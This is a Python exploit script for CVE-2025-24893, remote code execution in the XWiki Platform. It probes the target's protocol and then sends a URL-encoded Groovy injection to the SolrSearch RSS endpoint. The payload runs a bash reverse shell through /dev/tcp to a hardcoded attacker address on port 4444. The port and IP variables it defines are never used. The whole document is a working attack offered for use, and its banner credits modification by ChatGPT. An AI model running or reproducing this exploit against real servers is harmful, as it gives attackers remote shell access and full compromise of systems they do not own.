import requests

def display_banner():
    print("="*80)
    print("Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution (Reverse Shell)")
    print("Made By Al Baradi Joy - Modified by ChatGPT")
    print("="*80)

def detect_protocol(domain):
    https_url = f"https://{domain}"
    http_url = f"http://{domain}"

    try:
        response = requests.get(https_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] Target supports HTTPS: {https_url}")
            return https_url
    except requests.exceptions.RequestException:
        print("[!] HTTPS not available, falling back to HTTP.")

    try:
        response = requests.get(http_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] Target supports HTTP: {http_url}")
            return http_url
    except requests.exceptions.RequestException:
        print("[✖] Target is unreachable on both HTTP and HTTPS.")
        exit(1)

def exploit(target_url):
    target_url = detect_protocol(target_url.replace("http://", "").replace("https://", "").strip())

    # Kali IP and Port for reverse shell
    kali_ip = "10.10.14.XX"   # <- 여기를 수정
    kali_port = "4444"        # <- 여기를 수정

    # Groovy reverse shell payload (bash)
    payload = f'''}}}}{{async async=false}}{{{{groovy}}}}'bash -c "bash -i >& /dev/tcp/10.10.14.72/4444 0>&1"' .execute(){{{{/groovy}}}}{{{{/async}}}}'''
    
    from urllib.parse import quote
    encoded_payload = quote(payload)
    
    exploit_url = f"{target_url}/xwiki/bin/get/Main/SolrSearch?media=rss&text={encoded_payload}"

    try:
        print(f"[+] Sending reverse shell payload to: {exploit_url}")
        response = requests.get(exploit_url, timeout=10)
        print("[✔] Exploit sent! Check your listener.")
    except requests.exceptions.RequestException as e:
        print(f"[✖] Exploit failed: {e}")

if __name__ == "__main__":
    display_banner()
    target = input("[?] Enter the target URL (without http/https): ").strip()
    exploit(target)
